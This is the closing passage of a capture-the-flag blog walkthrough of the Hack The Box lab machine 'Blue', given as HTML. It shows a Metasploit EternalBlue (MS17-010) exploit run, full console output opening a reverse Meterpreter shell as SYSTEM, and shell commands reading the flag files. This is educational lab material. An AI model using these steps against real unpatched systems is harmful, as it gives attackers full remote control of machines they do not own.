</span></span></code></pre></div><p>It appears that our <strong>target</strong> is indeed <strong>vulnerable</strong>, so we <strong>run</strong> our <strong>exploit</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl>run
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.20:4444 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445     - Host is likely VULNERABLE to MS17-010! - Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> x64 <span class=o>(</span>64-bit<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445     - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - The target is vulnerable.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Connecting to target <span class=k>for</span> exploitation.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - Connection established <span class=k>for</span> exploitation.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - Target OS selected valid <span class=k>for</span> OS indicated by SMB reply
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - CORE raw buffer dump <span class=o>(</span><span class=m>42</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - 0x00000000  <span class=m>57</span> <span class=m>69</span> 6e <span class=m>64</span> 6f <span class=m>77</span> <span class=m>73</span> <span class=m>20</span> <span class=m>37</span> <span class=m>20</span> <span class=m>50</span> <span class=m>72</span> 6f <span class=m>66</span> <span class=m>65</span> <span class=m>73</span>  Windows <span class=m>7</span> Profes
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - 0x00000010  <span class=m>73</span> <span class=m>69</span> 6f 6e <span class=m>61</span> 6c <span class=m>20</span> <span class=m>37</span> <span class=m>36</span> <span class=m>30</span> <span class=m>31</span> <span class=m>20</span> <span class=m>53</span> <span class=m>65</span> <span class=m>72</span> <span class=m>76</span>  sional <span class=m>7601</span> Serv
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - 0x00000020  <span class=m>69</span> <span class=m>63</span> <span class=m>65</span> <span class=m>20</span> <span class=m>50</span> <span class=m>61</span> <span class=m>63</span> 6b <span class=m>20</span> <span class=m>31</span>                    ice Pack <span class=m>1</span>      
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - Target arch selected valid <span class=k>for</span> arch indicated by DCE/RPC reply
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Trying exploit with <span class=m>12</span> Groom Allocations.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Sending all but last fragment of exploit packet
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Starting non-paged pool grooming
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - Sending SMBv2 buffers
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Sending final SMBv2 buffers.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Sending last fragment of exploit packet!
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Receiving response from exploit packet
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - ETERNALBLUE overwrite completed successfully <span class=o>(</span>0xC000000D<span class=o>)</span>!
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Sending egg to corrupted connection.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Triggering free of corrupted buffer.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>200774</span> bytes<span class=o>)</span> to 10.129.174.73
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>1</span> opened <span class=o>(</span>10.10.14.20:4444 -&gt; 10.129.174.73:49158<span class=o>)</span> at 2023-06-03 10:49:25 +0100
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-WIN-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 1<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=o>)</span> &gt;
</span></span></code></pre></div><p>A <strong>meterpreter</strong> session was <strong>successfully opened</strong> and we have a <strong>shell connection</strong> to our <strong>target</strong>. As we can see, we are logged in with the <em><strong>NT AUTHORITY\SYSTEM</strong></em> account, which has the <strong>highest privileges</strong> on a a local windows system, it&rsquo;s even <strong>more</strong> <strong>powerful</strong> that than the local <strong>admin account</strong>. Therefore, there is simply no need for any <strong>lateral movement</strong> or <strong>privilege escalation</strong> on our part, we already <strong>possess</strong> the <strong>privileges</strong> to <strong>access</strong> both of the <strong>flags</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl>getuid
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 1<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=o>)</span> &gt; getuid
</span></span><span class=line><span class=cl>Server username: NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 1<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=o>)</span> &gt;
</span></span></code></pre></div><h2 id=post-exploitation><strong>POST-EXPLOITATION</strong><a hidden class=anchor aria-hidden=true href=#post-exploitation>#</a></h2><p>All that&rsquo;s left for us now is to <strong>find</strong> and <strong>grab</strong> both the <strong>user</strong> and the <strong>root</strong> <strong>flags</strong>. We <strong>drop into</strong> the <strong>system command shell</strong>, since <strong>traversing</strong> the directories on a <strong>windows</strong> system might seem easier via <em><strong>cmd</strong></em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl>shell
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 1<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=o>)</span> &gt; shell
</span></span><span class=line><span class=cl>Process <span class=m>1128</span> created.
</span></span><span class=line><span class=cl>Channel <span class=m>1</span> created.
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;
</span></span></code></pre></div><p>Once we <strong>identify</strong> the local user account - <em>haris</em> -, we head over to his <em>Desktop</em> and <strong>grab</strong> the <strong>user flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl>shell
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; <span class=nb>cd</span> c:<span class=se>\u</span>sers<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=nb>cd</span> c:<span class=se>\u</span>sers<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BE92-053B
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of c:<span class=se>\U</span>sers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>21/07/2017  07:56    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>21/07/2017  07:56    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>21/07/2017  07:56    &lt;DIR&gt;          Administrator
</span></span><span class=line><span class=cl>14/07/2017  14:45    &lt;DIR&gt;          haris
</span></span><span class=line><span class=cl>12/04/2011  08:51    &lt;DIR&gt;          Public
</span></span><span class=line><span class=cl>               <span class=m>0</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>5</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,694,017,024 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers&gt;cd haris<span class=se>\d</span>esktop<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=nb>cd</span> haris<span class=se>\d</span>esktop<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\h</span>aris<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BE92-053B
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of c:<span class=se>\U</span>sers<span class=se>\h</span>aris<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>24/12/2017  03:23    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>24/12/2017  03:23    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>03/06/2023  09:33                <span class=m>34</span> user.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>34</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,694,017,024 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\h</span>aris<span class=se>\D</span>esktop&gt;type user.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> user.txt
</span></span><span class=line><span class=cl>&lt;user-flag&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\h</span>aris<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><p>Grabbing the <strong>root flag</strong> is even easier, we already know that it is usually sitting on the <strong>Administrator</strong>&rsquo;s <em>Desktop</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl><span class=nb>type</span> c:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop<span class=se>\r</span>oot.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\h</span>aris<span class=se>\D</span>esktop&gt; <span class=nb>cd</span> c:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl><span class=nb>cd</span> c:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BE92-053B
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of c:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>24/12/2017  03:22    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>24/12/2017  03:22    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>03/06/2023  09:33                <span class=m>34</span> root.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>34</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,694,017,024 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;type root.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> root.txt
</span></span><span class=line><span class=cl>&lt;root-flag&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><p>With this, we just successfully <strong>pwned</strong> the <strong>target machine</strong>, <strong>congratulations</strong>. All that&rsquo;s left for us now is to <strong>submit</strong> the <strong>flags</strong> and then <strong>terminate</strong> the <strong>target</strong> box (if not terminated already)!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/blue/>blue</a></li><li><a href=https://bluewalle.github.io/tags/windows-target/>windows-target</a></li><li><a href=https://bluewalle.github.io/tags/easy-box/>easy-box</a></li><li><a href=https://bluewalle.github.io/tags/user-own/>user-own</a></li><li><a href=https://bluewalle.github.io/tags/system-own/>system-own</a></li><li><a href=https://bluewalle.github.io/tags/retired/>retired</a></li><li><a href=https://bluewalle.github.io/tags/network/>network</a></li><li><a href=https://bluewalle.github.io/tags/vulnerability-assessment/>vulnerability-assessment</a></li><li><a href=https://bluewalle.github.io/tags/protocols/>protocols</a></li><li><a href=https://bluewalle.github.io/tags/outdated-software/>outdated-software</a></li><li><a href=https://bluewalle.github.io/tags/security-tools/>security-tools</a></li><li><a href=https://bluewalle.github.io/tags/metasploit/>metasploit</a></li><li><a href=https://bluewalle.github.io/tags/smb/>smb</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li><li><a href=https://bluewalle.github.io/tags/eternal-blue/>eternal-blue</a></li><li><a href=https://bluewalle.github.io/tags/cve-2017-0144/>cve-2017-0144</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>